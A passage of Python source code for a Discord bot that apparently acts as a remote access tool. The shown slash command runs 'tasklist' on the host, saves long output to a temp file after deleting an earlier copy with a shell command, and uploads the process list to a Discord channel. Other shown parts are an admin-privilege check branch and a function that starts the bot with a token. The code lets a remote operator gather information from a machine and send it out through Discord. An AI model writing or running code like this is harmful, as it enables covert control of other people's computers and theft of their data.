                my_embed = discord.Embed(title=f"Admin privileges required", color=0xFF0000)
                await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="listProccess", description="List all active proccess", guild_ids=g)
async def listProccess_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            if 1==1:
                result = subprocess.getoutput("tasklist")
                numb = len(result)
                if numb < 1:
                    await ctx.send("Command not recognized or no output was obtained")
                elif numb > 1990:
                    temp = (os.getenv('TEMP'))
                    if os.path.isfile(temp + r"\\output.txt"):
                        os.system(r"del %temp%\\output.txt /f")
                    f1 = open(temp + r"\\output.txt", 'a')
                    f1.write(result)
                    f1.close()
                    my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
                    await ctx.send(embed=my_embed)
                    file = discord.File(temp + r"\\output.txt", filename="output.txt")
                    await ctx.send(file=file)
                else:
                    my_embed = discord.Embed(title=f"Command executed : {result}", color=0x00FF00)
                    await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)
#endregion

#endregion


def token_set(str):
    token = str
    client.run(token)
